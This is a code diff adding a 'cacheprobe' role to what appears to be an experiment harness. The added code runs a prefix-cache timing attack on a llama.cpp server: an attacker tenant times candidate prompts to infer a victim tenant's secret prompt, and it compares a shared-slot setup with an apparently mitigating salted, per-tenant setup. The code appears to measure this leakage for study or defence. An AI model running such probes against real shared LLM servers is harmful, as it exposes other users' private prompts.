@@ -102,3 +102,25 @@ elif ROLE == "blue":
             elif it["channel"] == "filesystem":
                 notes.write(f"note: {it['text']}\n")
         notes.close(); sys.stdout.flush()
+
+elif ROLE == "cacheprobe":
+    # Tenant B's prefix-cache timing attack on a llama.cpp server. Per probe: victim A sends its
+    # seeded prompt (secret s), then B sends candidate j and times it; B guesses the fastest j.
+    import urllib.request
+    url, cfg = os.environ["LLM_URL"], json.loads(base64.b64decode(os.environ["PROBE"]))
+    def complete(prompt, slot):
+        body = json.dumps({"prompt": prompt, "n_predict": 1, "cache_prompt": True, "id_slot": slot, "temperature": 0}).encode()
+        t = time.perf_counter()
+        r = json.loads(urllib.request.urlopen(urllib.request.Request(url + "/completion", body, {"Content-Type": "application/json"}), timeout=120).read())
+        return time.perf_counter() - t, r.get("timings", {}).get("prompt_n")
+    rnd = random.Random(cfg["seed"]); out = []
+    salt = lambda tenant: cfg["salts"][tenant] if cfg["salted"] else ""
+    slot = lambda tenant: cfg["slots"][tenant] if cfg["salted"] else cfg["slots"]["shared"]
+    complete("warm up", slot("B"))
+    for cands in cfg["candidates"]:   # a fresh candidate set per trial, so B's own earlier probes never match
+        s = rnd.randrange(len(cands)); order = list(range(len(cands))); rnd.shuffle(order); times, evaluated = {}, {}
+        for j in order:
+            complete(salt("A") + cfg["header"] + cands[s] + cfg["body"], slot("A"))
+            times[j], evaluated[j] = complete(salt("B") + cfg["header"] + cands[j] + cfg["body"], slot("B"))
+        out.append({"secret": s, "guess": min(times, key=times.get), "ms": {j: t * 1e3 for j, t in times.items()}, "prompt_n": evaluated})
+    print(json.dumps(out))
